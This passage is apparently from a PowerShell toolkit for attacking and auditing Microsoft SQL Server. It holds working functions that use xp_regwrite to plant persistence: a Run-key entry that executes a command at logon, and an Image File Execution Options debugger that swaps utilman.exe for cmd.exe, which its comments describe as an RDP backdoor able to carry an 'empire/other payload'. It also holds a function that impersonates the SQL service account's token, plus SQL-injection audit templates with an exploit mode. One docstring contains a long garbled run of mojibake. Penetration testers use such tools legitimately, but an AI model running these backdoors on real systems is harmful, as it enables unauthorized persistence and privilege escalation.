    Begin
    {
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Get SQL Server version number
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Check if this can actually run with the current login
        if($IsSysadmin -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }else{

            Write-Verbose "$Instance : Attempting to write value: $name"
            Write-Verbose "$Instance : Attempting to write command: $command"
        }

        # Setup query for registry update
        $Query = "
       ---------------------------------------------
        -- Use xp_regwrite to configure 
        -- a file to execute sa command when users l
        -- log into the system
        ----------------------------------------------
        EXEC master..xp_regwrite
        @rootkey     = 'HKEY_LOCAL_MACHINE',
        @key         = 'Software\Microsoft\Windows\CurrentVersion\Run',
        @value_name  = '$Name',
        @type        = 'REG_SZ',
        @value       = '$Command'"

        # Execute query
        $Results = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        
        # Setup query to verify the write is successful
        $CheckQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------
        -- Get AutoLogin Default Domain
        DECLARE @CheckValue  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'Software\Microsoft\Windows\CurrentVersion\Run',
        @value_name		= N'$Name',
        @value			= @CheckValue output
        
        -- Display Results
        SELECT CheckValue = @CheckValue"

        # Execute query
        $CheckResults = Get-SQLQuery -Instance $Instance -Query $CheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
        $CheckCommand = $CheckResults.CheckValue   
        if($CheckCommand.length -ge 2){
            Write-Verbose "$Instance : Registry entry written."                   
        }else{
            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
        } 
    }

    End
    {
        # Return message
        Write-Verbose "$Instance : Done."
    }
}

# ----------------------------------
#  Get-SQLPersistRegDebugger 
# ----------------------------------
# Author: Scott Sutherland
Function   Get-SQLPersistRegDebugger
{
    <#
            .SYNOPSIS
            This function uses xp_regwrite to configure a debugger for a provided 
            executable (utilman.exe by default), which will run another provided 
            executable (cmd.exe by default) when itÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢s called. It is commonly used 
            to create RDP backdoors. The specific registry key is 
            HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options[EXE].  
            Sysadmin privileges are required.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER FileName
            File to replace execution on.
            .PARAMETER Command
            Command to run.

            .Example
            PS C:\> Get-SQLPersistRegDebugger-Verbose -FileName utilman.exe -Command 'c:\windows\system32\cmd.exe' -Instance "SQLServer1\STANDARDDEV2014"
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write debugger for: utilman.exe
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: c:\windows\system32\cmd.exe
            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.

            .Example
            PS C:\> Get-SQLPersistRegDebugger-Verbose -Name sethc.exe -Command "PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"" -Instance "SQLServer1\STANDARDDEV2014"
            VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write debugger for: sethc.exe
            VERBOSE: SQLServer1\STANDARDDEV2014 : Attempting to write command: PowerShell.exe -C "Write-Output hacker | Out-File C:\temp\iamahacker.txt"
            VERBOSE: SQLServer1\STANDARDDEV2014 : Registry entry written.
            VERBOSE: SQLServer1\STANDARDDEV2014 : Done.

            .Notes
            http://sqlmag.com/t-sql/using-t-sql-manipulate-registry
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Name of the registry value.')]
        [string]$FileName= "utilman.exe",

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'The command to run.')]
        [string]$Command = 'c:\windows\system32\cmd.exe',

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }       

        # Get sysadmin status
        $IsSysadmin = Get-SQLSysadminCheck -Instance $Instance -Credential $Credential -Username $Username -Password $Password -SuppressVerbose | Select-Object -Property IsSysadmin -ExpandProperty IsSysadmin

        # Get SQL Server version number
        $SQLVersionFull = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Select-Object -Property SQLServerVersionNumber -ExpandProperty SQLServerVersionNumber
        if($SQLVersionFull)
        {
            $SQLVersionShort = $SQLVersionFull.Split('.')[0]
        }

        # Check if this can actually run with the current login
        if($IsSysadmin -ne "Yes")
        {          
            Write-Verbose "$Instance : This function requires sysadmin privileges. Done."
            Return
        }else{

            Write-Verbose "$Instance : Attempting to write debugger: $FileName"
            Write-Verbose "$Instance : Attempting to write command: $Command"
        }

        # Setup query for registry update
        $Query = "
       --- This will create a registry key through SQL Server (as sysadmin)
        -- to run a defined debugger (any command) instead of intended command
        -- in the example utilman.exe can be replace with cmd.exe and executed on demand via rdp
        --- note: this could easily be a empire/other payload
        EXEC master..xp_regwrite
        @rootkey     = 'HKEY_LOCAL_MACHINE',
        @key         = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
        @value_name  = 'Debugger',
        @type        = 'REG_SZ',
        @value       = '$Command'"

        # Execute query
        $Results = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        
        # Setup query to verify the write is successful
        $CheckQuery = "
        -------------------------------------------------------------------------
        -- Get Windows Auto Login Credentials from the Registry
        -------------------------------------------------------------------------
        -- Get AutoLogin Default Domain
        DECLARE @CheckValue  SYSNAME
        EXECUTE master.dbo.xp_regread
        @rootkey		= N'HKEY_LOCAL_MACHINE',
        @key			= N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$FileName',
        @value_name		= N'Debugger',
        @value			= @CheckValue output
        
        -- Display Results
        SELECT CheckValue = @CheckValue"

        # Execute query
        $CheckResults = Get-SQLQuery -Instance $Instance -Query $CheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
        $CheckCommand = $CheckResults.CheckValue   
        if($CheckCommand.length -ge 2){
            Write-Verbose "$Instance : Registry entry written."                   
        }else{
            Write-Verbose "$Instance : Fail to write to registry due to insufficient privileges."
        } 
    }

    End
    {
        # Return message
        Write-Verbose "$Instance : Done."
    }
}
#endregion

#########################################################################
#
#region          PRIVILEGE ESCALATION FUNCTIONS
#
#########################################################################

# ---------------------------------------
# Template Function
# ---------------------------------------
# Author: Scott Sutherland
# Note: This is just a template for building other escalation functions.
Function Invoke-SQLAuditTemplate
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: [VULNERABILITY NAME]"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = ''
        $Description   = ''
        $Remediation   = ''
        $Severity      = ''
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "[CurrentCommand] -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = ''
        $Author        = 'First Last (Twitter), Company Year'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes"


        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"


        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"


        # Add to report example
        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: [VULNERABILITY NAME]"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ----------------------------------
#  Invoke-SQLImpersonateService
# ----------------------------------
# Author: Mike Manzotti (@mmanzo_) and Scott Sutherland
Function  Invoke-SQLImpersonateService
{
    <#
            .PARAMETER Instance
            This function can be used to impersonate a local SQL Server service account.
            .EXAMPLE
            PS C:\> Invoke-SQLImpersonateService -Instance SQLServer1\STANDARDDEV2014 -Verbose
            VERBOSE: SQLServer1\STANDARDDEV2014 : Impersonating SQLServer1\STANDARDDEV2014 service account
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Process ID: 1234
            VERBOSE: SQLServer1\STANDARDDEV2014 : - Service Account: LocalSystem

    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'This can be used to revert to the original Windows user context.')]
        [switch]$Rev2Self,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
    }

    Process
    {
        
        # Revert to original user context if flag is provided
        if($Rev2Self){          
            Invoke-TokenManipulation -RevToSelf | Out-Null
            Return
        }

        # Check for provide instance
        if(-not $Instance){
            Write-Verbose "$Instance : No instance provided."
            Return
        }

        # Get current user name
        $WinCurrentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().name

        # Verify local administrator privileges
        $IsAdmin = Get-SQLLocalAdminCheck
                
        # Return if the current user does not have local admin privs
        if($IsAdmin -ne $true){
            write-verbose  "$Instance : $WinCurrentUserName DOES NOT have local admin privileges."
            return
        }else{
            write-verbose  "$Instance : $WinCurrentUserName has local admin privileges."
        }

        # Check for running sql service processes that match the instance
        Write-Verbose -Message "$Instance : Impersonating SQL Server process:" 
        [int]$TargetPid = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceProcessId -ExpandProperty ServiceProcessId
        [string]$TargetServiceAccount = Get-SQLServiceLocal -SuppressVerbose -instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"} | Select-Object ServiceAccount -ExpandProperty ServiceAccount
                
        # Return if no matches exist
        if ($TargetPid -eq 0){
            Write-Verbose -Message "$Instance : No process running for provided instance..."
            return
        }

        # Status user if a match is found
        Write-Verbose -Message "$Instance : - Process ID: $TargetPid"
        Write-Verbose -Message "$Instance : - ServiceAccount: $TargetServiceAccount" 
                
        # Attempt impersonation 
        try{
            Get-Process | Where-Object {$_.id -like $TargetPid} | Invoke-TokenManipulation -Instance $Instance -ImpersonateUser -ErrorAction Continue | Out-Null               
        }catch{
            $ErrorMessage = $_.Exception.Message
            Write-Verbose -Message "$Instance : Impersonation failed."
            Write-Verbose  -Message " $Instance : $ErrorMessage"
            return
        }  
        
        Write-Verbose  -Message "$Instance : Done."                    
    }

    End
    {
    }
}


# ---------------------------------------
# Invoke-SQLAuditSQLiSpExecuteAs
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditSQLiSpExecuteAs
{
    <#
            .SYNOPSIS
            This will return stored procedures using dynamic SQL and the EXECUTE AS OWNER clause that may suffer from SQL injection.
            There is also an options to check for 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditSQLiSpExecuteAs -Instance SQLServer1\STANDARDDEV2014

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Potential SQL Injection
            Description   : The affected procedure is using dynamic SQL and the "EXECUTE AS OWNER" clause.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.
            server.
            Remediation   : Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
            Severity      : High
            IsVulnerable  : Yes
            IsExploitable : No
            Exploited     : No
            ExploitCmd    : No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance SQLServer1\STANDARDDEV2014 -Keyword "EXECUTE AS OWNER" 
            Details       : The testdb.dbo.sp_vulnerable stored procedure is affected.
            Reference     : https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditSQLiSpExecuteAs -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Potential SQL Injection - EXECUTE AS OWNER."
            Return
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Potential SQL Injection - EXECUTE AS OWNER'
        $Description   = 'The affected procedure is using dynamic SQL and the "EXECUTE AS OWNER" clause.  As a result, it may be possible to impersonate the procedure owner if SQL injection is possible.'
        $Remediation   = 'Consider using parameterized queries instead of concatenated strings, and use signed procedures instead of the "EXECUTE AS OWNER" clause.'
        $Severity      = 'High'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "No automated exploitation option has been provided, but to view the procedure code use: Get-SQLStoredProcedureSQLi -Verbose -Instance $Instance -Keyword `"EXECUTE AS OWNER`"'"
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        # $IsVulnerable  = "No" or $IsVulnerable  = "Yes"
                
        # Get SP with dynamic sql and execute as owner
        $SQLiResults = Get-SQLStoredProcedureSQLi -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Keyword "EXECUTE AS OWNER" 
        
        # Check for results
        if($SQLiResults.rows.count -ge 1){
            
            # Confirmed vulnerable
